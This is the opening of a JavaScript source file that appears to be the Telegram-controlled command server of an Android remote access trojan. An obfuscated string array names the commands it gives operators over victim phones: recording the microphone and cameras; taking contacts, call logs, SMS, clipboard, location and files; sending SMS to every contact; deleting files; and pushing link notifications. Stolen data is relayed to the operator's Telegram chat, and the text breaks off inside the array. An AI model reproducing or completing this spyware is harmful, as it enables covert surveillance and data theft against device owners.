const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios')

const token = 'your token here'
const id = 'chat id here'
const address = 'https://www.google.com'

var _0xdc21 = ["createServer", "json", "use", "", "/", "<h1 align=\"center\">๐๐๐ง๐ซ๐๐ง ๐ช๐ฅ๐ก๐ค๐๐๐๐ ๐จ๐ช๐๐๐๐จ๐จ๐๐ช๐ก๐ก๐ฎ</h1>", "send", "get", "/uploadFile", "file", "single", "originalname", "buffer", "\xB0\u2022\x20\uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62\x20\x3C\x62\x3E", "model", "headers", "</b> ๐๐๐ซ๐๐๐", "HTML", "application/txt", "sendDocument", "post", "/uploadText", "</b> ๐๐๐ซ๐๐๐\\n\\n", "text", "body", "sendMessage", "/uploadLocation", "lat", "lon", "sendLocation", "\xB0\u2022\x20\uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x20\uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62\x20\x3C\x62\x3E", "connection", "v4", "battery", "version", "brightness", "provider", "uuid", "set", "\xB0\u2022\x20\uD835\uDE49\uD835\uDE5A\uD835\uDE6C\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59\x5C\x6E\x5C\x6E", "โข แดแดแด ษชแดแด แดแดแดแดส : <b>", "</b>\\n", "โข สแดแดแดแดสส : <b>", "โข แดษดแดสแดษชแด แด แดส๊ฑษชแดษด : <b>", "โข ๊ฑแดสแดแดษด สสษชษขสแดษดแด๊ฑ๊ฑ : <b>", "โข แดสแดแด ษชแดแดส : <b>", "</b>", "close", "\xB0\u2022\x20\uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x20\uD835\uDE59\uD835\uDE5E\uD835\uDE68\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59\x5C\x6E\x5C\x6E", "delete", "on", "message", "id", "chat", "reply_to_message", "\xB0\u2022\x20\uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE4E\uD835\uDE48\uD835\uDE4E", "includes", "\xB0\u2022\x20\uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69\x2C\x20\uD835\uDE63\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68\x20\uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\x0A\x0A", "โข สแด แดแดสแด๊ฐแดส แดสแดแด แดสแด แดแด๊ฑ๊ฑแดษขแด แดกษชสส ษดแดแด สแด ๊ฑแดษดแด ษช๊ฐ แดสแด ษดแดแดสแดส แด๊ฐ แดสแดสแดแดแดแดส๊ฑ ษชษด สแดแดส แดแด๊ฑ๊ฑแดษขแด ษช๊ฑ แดแดสแด แดสแดษด แดสสแดแดกแดแด", "\xB0\u2022\x20\uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69\x2C\x20\uD835\uDE63\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68\x20\uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67", "send_message:", "forEach", "clients", "\xB0\u2022\x20\uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69\x20\uD835\uDE5E\uD835\uDE68\x20\uD835\uDE64\uD835\uDE63\x20\uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\x0A\x0A", "โข สแดแด แดกษชสส สแดแดแดษชแด แด แด สแด๊ฑแดแดษด๊ฑแด ษชษด แดสแด ษดแดxแด ๊ฐแดแดก แดแดแดแดษดแด๊ฑ", "๐พ๐ค๐ฃ๐ฃ๐๐๐ฉ๐๐ ๐๐๐ซ๐๐๐๐จ", "๐๐ญ๐๐๐ช๐ฉ๐ ๐๐ค๐ข๐ข๐๐ฃ๐", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE61\uD835\uDE61\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68", "send_message_to_all:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59", "file:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A", "delete_file:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE5D\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59", "microphone:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE5D\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE56\uD835\uDE5E\uD835\uDE63\x20\uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59", "rec_camera_main:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE5D\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A\x20\uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59", "rec_camera_selfie:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67\x20\uD835\uDE64\uD835\uDE63\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A", "toast:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67\x20\uD835\uDE56\uD835\uDE68\x20\uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63", "\xB0\u2022\x20\uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69\x2C\x20\uD835\uDE63\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59\x20\uD835\uDE57\uD835\uDE6E\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x0A\x0A", "โข แดกสแดษด แดสแด แด ษชแดแดษชแด แดสษชแดแด๊ฑ แดษด แดสแด ษดแดแดษช๊ฐษชแดแดแดษชแดษด, แดสแด สษชษดแด สแดแด แดสแด แดษดแดแดสษชษดษข แดกษชสส สแด แดแดแดษดแดแด", "\xB0\u2022\x20\uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69\x2C\x20\uD835\uDE63\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59\x20\uD835\uDE57\uD835\uDE6E\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63", "show_notification:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64\x20\uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E", "play_audio:", "/start", "\xB0\u2022\x20\uD835\uDE52\uD835\uDE5A\uD835\uDE61\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE4D\uD835\uDE56\uD835\uDE69\x20\uD835\uDE65\uD835\uDE56\uD835\uDE63\uD835\uDE5A\uD835\uDE61\x0A\x0A", "โข ษช๊ฐ แดสแด แดแดแดสษชแดแดแดษชแดษด ษช๊ฑ ษชษด๊ฑแดแดสสแดแด แดษด แดสแด แดแดสษขแดแด แดแดแด ษชแดแด, แดกแดษชแด ๊ฐแดส แดสแด แดแดษดษดแดแดแดษชแดษด\x0A\x0A", "โข แดกสแดษด สแดแด สแดแดแดษชแด แด แดสแด แดแดษดษดแดแดแดษชแดษด แดแด๊ฑ๊ฑแดษขแด, ษชแด แดแดแดษด๊ฑ แดสแดแด แดสแด แดแดสษขแดแด แดแดแด ษชแดแด ษช๊ฑ แดแดษดษดแดแดแดแดแด แดษดแด สแดแดแดส แดแด สแดแดแดษชแด แด แดสแด แดแดแดแดแดษดแด\x0A\x0A", "โข แดสษชแดแด แดษด แดสแด แดแดแดแดแดษดแด สแดแดแดแดษด แดษดแด ๊ฑแดสแดแดแด แดสแด แดแด๊ฑษชสแดแด แดแดแด ษชแดแด แดสแดษด ๊ฑแดสแดแดแด แดสแด แดแด๊ฑษชสแดแด แดแดแดแดแดษดแด แดแดแดษดษข แดสแด แดแดแดแดแดษดแด๊ฑ\x0A\x0A", "โข ษช๊ฐ สแดแด ษขแดแด ๊ฑแดแดแดแด ๊ฑแดแดแดแดกสแดสแด ษชษด แดสแด สแดแด, ๊ฑแดษดแด /start แดแดแดแดแดษดแด", "size", "\xB0\u2022\x20\uD835\uDE49\uD835\uDE64\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68\x20\uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\x0A\x0A", "โข แดแดแดแด ๊ฑแดสแด แดสแด แดแดแดสษชแดแดแดษชแดษด ษช๊ฑ ษชษด๊ฑแดแดสสแดแด แดษด แดสแด แดแดสษขแดแด แดแดแด ษชแดแด", "\xB0\u2022\x20\uD835\uDE47\uD835\uDE5E\uD835\uDE68\uD835\uDE69\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68\x20\x3A\x0A\x0A", "</b>\\n\\n", "device:", "push", "\xB0\u2022\x20\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE5A\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A\x20\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59", "\xB0\u2022\x20\uD835\uDE4B\uD835\uDE5A\uD835\uDE67\uD835\uDE62\uD835\uDE5E\uD835\uDE68\uD835\uDE68\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE63\uD835\uDE5E\uD835\uDE5A\uD835\uDE59", "callback_query", "data", ":", "split", "log", "device", "\xB0\u2022\x20\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69\x20\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE5B\uD835\uDE64\uD835\uDE67\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x20\x3A\x20\x3C\x62\x3E", "message_id", "๐ผ๐ฅ๐ฅ๐จ", "apps:", "๐ฟ๐๐ซ๐๐๐ ๐๐ฃ๐๐ค", "device_info:", "๐๐๐ฉ ๐๐๐ก๐", "๐ฟ๐๐ก๐๐ฉ๐ ๐๐๐ก๐", "๐พ๐ก๐๐ฅ๐๐ค๐๐ง๐", "clipboard:", "๐๐๐๐ง๐ค๐ฅ๐๐ค๐ฃ๐", "๐๐๐๐ฃ ๐๐๐ข๐๐ง๐", "camera_main:", "๐๐๐ก๐๐๐ ๐๐๐ข๐๐ง๐", "camera_selfie:", "๐๐ค๐๐๐ฉ๐๐ค๐ฃ", "location:", "๐๐ค๐๐จ๐ฉ", "๐พ๐๐ก๐ก๐จ", "calls:", "๐พ๐ค๐ฃ๐ฉ๐๐๐ฉ๐จ", "contacts:", "๐๐๐๐ง๐๐ฉ๐", "vibrate:", "๐๐๐ค๐ฌ ๐ฃ๐ค๐ฉ๐๐๐๐๐๐ฉ๐๐ค๐ฃ", "๐๐๐จ๐จ๐๐๐๐จ", "messages:", "๐๐๐ฃ๐ ๐ข๐๐จ๐จ๐๐๐", "๐๐ก๐๐ฎ ๐๐ช๐๐๐ค", "๐๐ฉ๐ค๐ฅ ๐๐ช๐๐๐ค", "stop_audio:", "๐๐๐ฃ๐ ๐ข๐๐จ๐จ๐๐๐ ๐ฉ๐ค ๐๐ก๐ก ๐๐ค๐ฃ๐ฉ๐๐๐ฉ๐จ", "editMessageText", "calls", "deleteMessage", "contacts", "messages", "apps", "device_info", "clipboard", "camera_main", "camera_selfie", "location", "vibrate", "stop_audio", "send_message", "\xB0\u2022\x20\uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE4E\uD835\uDE48\uD835\uDE4E\x0A\x0A", "โขษช๊ฐ สแดแด แดกแดษดแด แดแด ๊ฑแดษดแด ๊ฑแด๊ฑ แดแด สแดแดแดส แดแดแดษดแดสส ษดแดแดสแดส๊ฑ, สแดแด แดแดษด แดษดแดแดส แดสแด ษดแดแดสแดส แดกษชแดส แดขแดสแด แดแด แดสแด สแดษขษชษดษดษชษดษข, แดแดสแดสแดกษช๊ฑแด แดษดแดแดส แดสแด ษดแดแดสแดส แดกษชแดส แดสแด แดแดแดษดแดสส แดแดแดแด", "send_message_to_all", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE61\uD835\uDE61\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68\x0A\x0A", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\x0A\x0A", "โข สแดแด แดแด ษดแดแด ษดแดแดแด แดแด แดษดแดแดส แดสแด ๊ฐแดสส ๊ฐษชสแด แดแดแดส, แดแด๊ฑแด แดษดแดแดส แดสแด แดแดษชษด แดแดแดส. ๊ฐแดส แดxแดแดแดสแด, แดษดแดแดส<b> DCIM/Camera </b> แดแด สแดแดแดษชแด แด ษขแดสสแดสส ๊ฐษชสแด๊ฑ.", "delete_file", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A\x0A\x0A", "โข สแดแด แดแด ษดแดแด ษดแดแดแด แดแด แดษดแดแดส แดสแด ๊ฐแดสส ๊ฐษชสแด แดแดแดส, แดแด๊ฑแด แดษดแดแดส แดสแด แดแดษชษด แดแดแดส. ๊ฐแดส แดxแดแดแดสแด, แดษดแดแดส<b> DCIM/Camera </b> แดแด แดแดสแดแดแด ษขแดสสแดสส ๊ฐษชสแด๊ฑ.", "microphone", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE5D\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59\x0A\x0A", "โข ษดแดแดแด แดสแดแด สแดแด แดแด๊ฑแด แดษดแดแดส แดสแด แดษชแดแด ษดแดแดแดสษชแดแดสสส ษชษด แดษดษชแด๊ฑ แด๊ฐ ๊ฑแดแดแดษดแด๊ฑ", "toast", 